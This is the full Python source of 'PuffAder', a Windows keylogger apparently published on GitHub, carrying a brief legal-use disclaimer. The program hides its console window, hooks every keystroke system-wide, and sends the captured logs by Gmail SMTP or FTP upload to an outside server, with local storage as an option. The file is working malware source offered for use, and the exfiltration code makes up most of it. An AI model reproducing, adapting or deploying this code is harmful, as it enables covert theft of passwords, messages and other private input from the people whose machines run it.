'''
PuffAder Windows Keylogger by xp4xbox
https://github.com/xp4xbox/Puffader

Copyright (c) 2017 xp4xbox
MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE

NOTE: This program must be used for legal purposes only!
'''

import smtplib, time, os, threading, sys, subprocess
import win32console, win32gui, win32event, win32api, winerror
from win32con import VK_CAPITAL; from sys import exit; from ftplib import FTP
try:
    import pythoncom, pyHook
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print("required pyhook and py2win32")
    exit()

strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnFTP = "False"  # if using ftp set this to True and configure the options below
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 1000  # set num of chars before send log/store

blnUseTime = "False"  # if you prefer to use a timer for sending/storing, set this to True
strTimePerSend = 120  # set how often to send/store logs in seconds

blnStoreLocal = "False"  # True to save logs locally to winlog.txt instead
blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
# hide window as new thread. Necessary in order to define timer used later
objTimer = threading.Timer(0, hide);objTimer.start()

# open file in notepad if argument is given
if len(sys.argv) == 2:
    OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", sys.argv[1]])
    
# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()

blnStop = "False"

def OnKeyboardEvent(event):
    global strLogs, objTimer
    try:  # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
        try:
            if blnStop == "True":
                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            else:
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                strMessage = strDateTime + "\n\n" + strLogs
                strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)

                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                SmtpServer.ehlo()   # identifies you to the smtp server
                SmtpServer.login(strEmailAc, strEmailPass)
                SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
        except:
            os._exit(1)  # if for some reason, the email cannot send, exit program including threads.

    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
        try:
            ftp = FTP(); ftp.connect(strFtpServer, 21)
            ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
            # connect to ftp server

            TMP = os.environ["TEMP"]
            objLogFile = open(TMP + "/log.txt", 'w')
            if blnStop == "True":
                objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
            else:
                objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
            objLogFile.write(strLogs); objLogFile.close()
            # create log file

            arFileList = ftp.nlst()
            if "log.txt" in arFileList:
                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("APPE log.txt", objLogFile)
            else:
                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("STOR log.txt", objLogFile)
            objLogFile.close()
            # send log file
        except:
            os._exit(1)

    def StoreMessagesLocal(strLogs, blnStop):
        # log keys locally to winlog.txt
        if os.path.isfile("winlog.txt"):
            objLogFile = open("winlog.txt", 'a')
        else:
            objLogFile = open("winlog.txt", 'w')
        if blnStop == "True":
            objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
        else:
            objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
        objLogFile.write(strLogs); objLogFile.close()

    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        # CTRL-RIGHT_SHIFT-H to stop the program
        if blnStoreLocal == "True":
            StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, "True"))
            StoreLogThread.start()
        elif blnFTP == "True":
            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
            SendFTPThread.start()
        else:
            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
            SendMailThread.start()
        exit()

    if event.Key == "Return":  # if the user types "enter" move to a new line
        strLogs = strLogs + "\n"
    elif event.Key == "Space":
        strLogs = strLogs + " "
    elif event.Key == "Back":
        if blnBackRemove == "True":
            if not strLogs == "":
                strLogs = strLogs[0:len(strLogs) - 1]
        else:
            strLogs = strLogs + " [Back] "
    elif event.Key == "Delete":
        strLogs = strLogs + " [Delete] "
    elif event.Key == "Tab":
        strLogs = strLogs + "\t"
    elif event.Key == "Oem_5":
        strLogs = strLogs + "\\"
    # check to see if key is shift + backslash
    elif event.Key == "Oem_5" and (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))):
        strLogs = strLogs + "|"
    elif event.Key == "Capital" or event.Key == "Rshift" or event.Key == "Lshift":
        pass
    elif len(event.Key) > 1:  # check to see if key is a special key
        strLogs = strLogs + " [" + event.Key + "] "
    else:
        # check to see if caps lock is on or the shift key is held down
        if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
            strLogs = strLogs + event.Key
        else:
            # since event.Key outputs all keys as uppercase, lower normal ones
            strLogs = strLogs + ((event.Key).lower())

    def CreateNewThreadMessages():  # function for creating thread for sending messages
        if not strLogs == "":  # if the log is not empty
            if blnStoreLocal == "True":
                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, blnStop))
                StoreLogThread.start()
            elif blnFTP == "True":
                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
                SendFTPThread.start()
            else:
                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
                SendMailThread.start()

    if blnUseTime == "True":  # if the user is sending messages by timer
        if not objTimer.is_alive():  # check to see if the timer is not active
            objTimer = threading.Timer(strTimePerSend, CreateNewThreadMessages)
            objTimer.start()
            strLogs = ""
    else:
        if len(strLogs) >= intCharPerSend:  # send/save message if log is certain length
            CreateNewThreadMessages()
            strLogs = ""
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
